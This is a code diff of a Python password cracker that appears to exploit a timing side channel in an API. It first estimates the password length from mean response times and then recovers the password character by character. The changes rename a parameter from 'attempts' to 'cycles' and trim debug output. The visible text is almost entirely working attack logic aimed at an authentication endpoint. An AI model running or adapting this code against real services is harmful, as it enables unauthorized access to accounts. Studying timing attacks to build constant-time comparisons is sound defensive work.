@@ -12,36 +12,34 @@ def apiRequest(inputPass):
     respTime = response.elapsed.total_seconds()
     return respTime
 
-def crackLength(maxLength=10, attempts=4) -> int:
+def crackLength(maxLength=10, cycles=4) -> int:
     confidenceDict = {}
     for i in range(maxLength):
         lengthResponseTimes = []
-        for k in range(attempts):
+        for k in range(cycles):
             lengthResponseTimes.append(apiRequest('a'*i))
         
         lengthConfidence = statistics.mean(lengthResponseTimes)
         confidenceDict[i]=lengthConfidence
-    print(confidenceDict)
     return max(confidenceDict, key=confidenceDict.get)
 
-def crackPassword(length, attempts=2):
+def crackPassword(length, cycles=2):
     guess = '0'*length
     for i in range(length):
         for char in CHARS:
             newGuess = guess[:i] + char + guess[i + 1:]
 
             guessResponseTimes = []
-            for k in range(attempts):
+            for k in range(cycles):
                 guessResponseTimes.append(apiRequest(guess))
             guessTime = statistics.mean(guessResponseTimes)
 
             newGuessResponseTimes = []
-            for k in range(attempts):
+            for k in range(cycles):
                 newGuessResponseTimes.append(apiRequest(newGuess))
             newGuessTime = statistics.mean(newGuessResponseTimes)
             
-            print('oldGuess: '+guess +',  newGuess: '+newGuess)
-            print('oldGuessTime: '+str(guessTime) +',  newGuessTime: '+str(newGuessTime))
+            print('Current guess: '+guess)
             
             if guessTime < newGuessTime:
                 guess = newGuess
